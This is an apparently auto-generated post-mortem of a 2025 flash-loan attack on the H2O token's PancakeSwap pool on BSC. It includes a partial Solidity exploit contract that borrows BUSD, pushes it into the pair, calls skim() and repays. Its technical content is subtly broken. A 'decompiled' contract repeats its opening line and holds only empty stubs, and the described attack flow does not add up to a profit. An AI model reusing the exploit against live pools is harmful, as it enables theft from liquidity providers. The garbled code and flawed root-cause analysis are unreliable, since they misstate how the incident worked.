# H2O — AMM Arbitrage Analysis via Price Manipulation

| Field | Details |
|------|------|
| **Date** | 2025-03-14 |
| **Protocol** | H2O Token |
| **Chain** | BSC |
| **Loss** | 22,470 USD |
| **Attacker** | [0x8842dd26fd301c74afc4df12e9cdabd9db107d1e](https://bscscan.com/address/0x8842dd26fd301c74afc4df12e9cdabd9db107d1e) |
| **Attack Tx** | [0x994abe79...](https://bscscan.com/tx/0x994abe7906a4a955c103071221e5eaa734a30dccdcdaac63496ece2b698a0fc3) |
| **Vulnerable Contract** | [0xe9c4d4f095c7943a9ef5ec01afd1385d011855a1](https://bscscan.com/address/0xe9c4d4f095c7943a9ef5ec01afd1385d011855a1) |
| **Root Cause** | Missing access control on `skim()` allows anyone to trigger reserve imbalances and manipulate AMM pricing |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-03/H2O_exp.sol) |

---

## 1. Vulnerability Overview

A price manipulation vulnerability exploiting the `skim()` function was discovered in the H2O token's PancakeSwap V2 pool. The attacker borrowed BUSD via a PancakeSwap V3 flash loan to create a discrepancy between the pool's reserves and its actual balances, then called `skim()` to manipulate the price and extract profit. The first attempt was unprofitable, but the fourth attempt succeeded.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable skim() function: callable by anyone, exploitable for reserve imbalance
function skim(address to) external {
    address _token0 = token0;
    address _token1 = token1;
    // If actual balance exceeds reserve, send the difference to `to`
    _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)) - reserve0);
    _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)) - reserve1);
    // ❌ No access control: callable by anyone
}

// ✅ Improved code
function skim(address to) external {
    require(msg.sender == factory || msg.sender == owner, "Not authorized"); // ✅ Access control
    // ...
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: H2O_decompiled.sol
contract H2O {
contract H2O {

    // Selector: 0xa9059cbb
    function transfer(address a, uint256 b) external {  // ❌ Vulnerability
        // TODO: decompile logic not implemented
    }

    // Selector: 0x9dc29fac
    function burn(address a, uint256 b) external {
        // TODO: decompile logic not implemented
    }

    // Selector: 0x4e487b71
    function Panic(uint256 a) external {
        // TODO: decompile logic not implemented
    }

    // Selector: 0x313ce567
    function decimals() external view returns (uint8) {
        // TODO: decompile logic not implemented
    }

    // Selector: 0x95d89b41
    function symbol() external view returns (string memory) {
        // TODO: decompile logic not implemented
    }

    // Selector: 0x18160ddd
    function totalSupply() external view returns (uint256) {
        // TODO: decompile logic not implemented
    }

    // Selector: 0x70a08231
    function balanceOf(address a) external view returns (uint256) {
        // TODO: decompile logic not implemented
    }

    // Selector: 0xdd62ed3e
    function allowance(address a, address b) external view returns (uint256) {
        // TODO: decompile logic not implemented
    }

    // Selector: 0x6ac5db19
    function max() external view returns (uint256) {
        // TODO: decompile logic not implemented
    }

    // Selector: 0x095ea7b3
    function approve(address a, uint256 b) external {
        // TODO: decompile logic not implemented
    }

    // Selector: 0x23b872dd
    function transferFrom(address a, address b, uint256 c) external {
        // TODO: decompile logic not implemented
    }

    // Selector: 0x8da5cb5b
    function owner() external view returns (address) {
        // TODO: decompile logic not implemented
    }

    // Selector: 0xb15be2f5
    function renounce() external {
        // TODO: decompile logic not implemented
    }

    // Selector: 0xa8aa1b31
    function pair() external view returns (address) {
        // TODO: decompile logic not implemented
    }

    // Selector: 0xb8bf0fc3
    function _o2() external {
        // TODO: decompile logic not implemented
    }

    // Selector: 0x3eaaf86b
    function _totalSupply() external view returns (uint256) {
        // TODO: decompile logic not implemented
    }

    // Selector: 0x7462ae73
    function getRandomOnchain() external view returns (uint256) {
        // TODO: decompile logic not implemented
    }

    // Selector: 0x06fdde03
    function name() external view returns (string memory) {
        // TODO: decompile logic not implemented
    }

    // Selector: 0x40c10f19
    function mint(address a, uint256 b) external view returns (uint256) {
        // TODO: decompile logic not implemented
    }

}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► PancakeSwap V3 Flash Loan (borrow BUSD)
  │
  ├─[2]─► Transfer large amount of BUSD directly into H2O/BUSD pool
  │         └─► Pool actual balance > reserve (imbalance created)
  │
  ├─[3]─► Call H2O pool.skim(attacker)
  │         └─► Excess BUSD transferred to attacker
  │
  ├─[4]─► Swap H2O tokens (realize profit after price manipulation)
  │
  ├─[5]─► Repay flash loan (BUSD + fee)
  │
  └─[6]─► Net profit: ~22,470 USD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackerC {
    function attack() external {
        // [1] Borrow BUSD via PancakeV3 flash loan
        PancakeV3Pool.flash(address(this), 0, BORROW_AMOUNT, "");
    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        // [2] Transfer borrowed BUSD directly into the H2O/BUSD LP pool
        // This causes the pool's actual balance > reserve imbalance
        IERC20(BUSD).transfer(H2O_BUSD_PAIR, BORROW_AMOUNT);

        // [3] Call skim() to claim the excess balance
        IUniswapV2Pair(H2O_BUSD_PAIR).skim(address(this));

        // [4] Swap acquired H2O tokens for BUSD to realize profit
        // swapExactTokensForTokensSupportingFeeOnTransferTokens(...)

        // [5] Repay flash loan
        IERC20(BUSD).transfer(msg.sender, BORROW_AMOUNT + fee1);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Missing Access Control (unrestricted `skim()` calls trigger AMM reserve imbalance) |
| **Attack Technique** | Flash Loan + `skim()` abuse |
| **DASP Category** | Front-Running / Price Oracle Manipulation |
| **CWE** | CWE-284: Improper Access Control |
| **Severity** | High |
| **Attack Complexity** | Medium |

## 6. Remediation Recommendations

1. **Access Control on skim()**: Add access control to the `skim()` function or disable it entirely.
2. **Prevent Same-Block Manipulation**: Shorten the reserve update interval or restrict consecutive calls within the same transaction.
3. **Use TWAP Oracle**: Use a Time-Weighted Average Price (TWAP) instead of spot price to improve manipulation resistance.

## 7. Lessons Learned

- **Danger of AMM skim() Functions**: The `skim()` function in Uniswap V2-derived AMMs can become a price manipulation vector when combined with flash loans.
- **Flash Loan Defense**: Logic to validate state changes following a flash loan is essential.
- **Multi-Attempt Attacks**: Attackers can iterate through multiple attempts to find optimal attack parameters; anomalous pattern detection systems are therefore critical.